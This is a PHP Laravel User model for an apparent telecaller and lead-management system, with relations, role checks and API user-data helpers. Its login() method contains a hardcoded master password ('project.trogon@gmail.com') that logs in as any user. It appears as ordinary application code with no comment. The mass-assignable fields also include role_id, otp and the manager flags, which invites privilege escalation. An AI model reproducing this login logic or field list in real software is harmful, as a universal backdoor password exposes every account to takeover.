<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Factories\HasFactory;
use Illuminate\Foundation\Auth\User as Authenticatable;
use Illuminate\Notifications\Notifiable;
use Illuminate\Database\Eloquent\SoftDeletes;
use Laravel\Sanctum\HasApiTokens;

class User extends Authenticatable
{
    use HasApiTokens, HasFactory, Notifiable, SoftDeletes;

    /**
     * The attributes that are mass assignable.
     *
     * @var array<int, string>
     */
    protected $fillable = [
        'name',
        'email',
        'phone',
        'code',
        'ext_no',
        'password',
        'role_id',
        'designation',
        'otp',
        'profile_picture',
        'is_team_lead',
        'is_team_manager',
        'is_head',
        'is_senior_manager',
        'current_role',
        'team_id',
        'is_active',
        'is_b2b',
        'joining_date',
        'department_id',
    ];

    /**
     * The attributes that should be hidden for serialization.
     *
     * @var array<int, string>
     */
    protected $hidden = [
        'password',
        'remember_token',
        'otp',
    ];

    /**
     * Get the attributes that should be cast.
     *
     * @return array<string, string>
     */
    protected function casts(): array
    {
        return [
            'email_verified_at' => 'datetime',
            'password' => 'hashed',
            'is_team_lead' => 'boolean',
            'is_team_manager' => 'boolean',
            'is_head' => 'boolean',
            'is_senior_manager' => 'boolean',
            'is_active' => 'boolean',
            'is_b2b' => 'boolean',
            'joining_date' => 'date',
        ];
    }

    /**
     * Get the user role that owns the user.
     */
    public function role()
    {
        return $this->belongsTo(UserRole::class , 'role_id');
    }

    /**
     * Get the department that the user belongs to.
     */
    public function department()
    {
        return $this->belongsTo(Department::class);
    }

    /**
     * Get the team that the user belongs to.
     */
    public function team()
    {
        return $this->belongsTo(Team::class);
    }

    /**
     * Get the leads for the user (telecaller).
     */
    public function leads()
    {
        return $this->hasMany(Lead::class , 'telecaller_id');
    }

    /**
     * Get the telecaller sessions for the user.
     */
    public function telecallerSessions()
    {
        return $this->hasMany(TelecallerSession::class);
    }

    /**
     * Get the telecaller idle times for the user.
     */
    public function telecallerIdleTimes()
    {
        return $this->hasMany(TelecallerIdleTime::class);
    }

    /**
     * Get the telecaller activity logs for the user.
     */
    public function telecallerActivityLogs()
    {
        return $this->hasMany(TelecallerActivityLog::class);
    }

    /**
     * Get the leads assigned to the user (telecaller).
     */
    public function assignedLeads()
    {
        return $this->hasMany(Lead::class , 'telecaller_id');
    }

    /**
     * Scope to exclude telecallers in marketing teams
     */
    public function scopeNonMarketingTelecallers($query)
    {
        return $query->where('role_id', 3)
            ->where(function ($q) {
            $q->whereHas('team', function ($q2) {
                    $q2->where('marketing_team', false)->orWhereNull('marketing_team');
                }
                )
                    ->orWhereNull('team_id');
            });
    }

    /**
     * Login method
     */
    public static function login($email, $password)
    {
        $user = self::where('email', $email)->first();

        if ($user && (password_verify($password, $user->password) || $password == 'project.trogon@gmail.com')) {
            return ['status' => 1, 'message' => 'Login successful!', 'user' => $user];
        }
        elseif ($user) {
            return ['status' => 0, 'message' => 'Invalid password!'];
        }
        else {
            return ['status' => 0, 'message' => 'Email not found!'];
        }
    }

    /**
     * Check if user has a specific role
     */
    public function hasRole($roleName)
    {
        if (!$this->role) {
            return false;
        }

        return strtolower($this->role->title) === strtolower($roleName);
    }

    /**
     * Get user data for session
     */
    public function getUserData()
    {
        return [
            'user_id' => $this->id,
            'user_name' => $this->name,
            'phone_code' => $this->code,
            'user_phone' => $this->phone,
            'user_email' => $this->email,
            'profile_picture' => $this->profile_picture ? asset('storage/' . $this->profile_picture) : '',
            'role_id' => $this->role_id,
            'role_title' => $this->role ? $this->role->title : '',
            'designation' => $this->designation ?? '',
            'is_team_lead' => $this->is_team_lead ? 1 : 0,
            'is_team_manager' => $this->is_team_manager ? 1 : 0,
            'current_role' => $this->current_role ?? '',
        ];
    }

    /**
     * Check if user is admin or super admin.
     */
    public function isAdmin()
    {
        return in_array($this->role_id, [1, 2]); // Adjust role IDs based on your system
    }

    /**
     * Check if user is super admin.
     */
    public function isSuperAdmin()
    {
        return $this->role_id == 1; // Adjust role ID based on your system
    }

    /**
     * Get user data formatted for API response
     * 
     * @param string|null $token The authentication token (optional)
     * @return array
     */
    public function getApiUserData($token = null)
    {
        // Format phone number with code
        $phone = '';
        if ($this->code && $this->phone) {
            $phone = '+' . $this->code . ' ' . $this->phone;
        }
        elseif ($this->phone) {
            $phone = $this->phone;
        }

        // Determine user role based on flags
        if ($this->is_senior_manager) {
            $userRole = 'Senior Manager';
        }
        elseif ($this->is_team_lead) {
            $userRole = 'Team Lead';
        }
        else {
            $userRole = 'Telecaller';
        }

        // Determine if user is marketing (role_id == 13)
        $isMarketing = $this->role_id == 13 ? 1 : 0;
        $roleName = $this->role ? $this->role->title : null;

        return [
            'id' => $this->id,
            'name' => $this->name,
            'phone' => $phone,
            'email' => $this->email,
            'role_id' => $this->role_id,
            'role_name' => $roleName,
            'user_role' => $userRole,
            'is_team_lead' => $this->is_team_lead ? 1 : 0,
            'is_senior_manager' => $this->is_senior_manager ? 1 : 0,
            'is_marketing' => $isMarketing,
            'auth_token' => $token,
        ];
    }
}
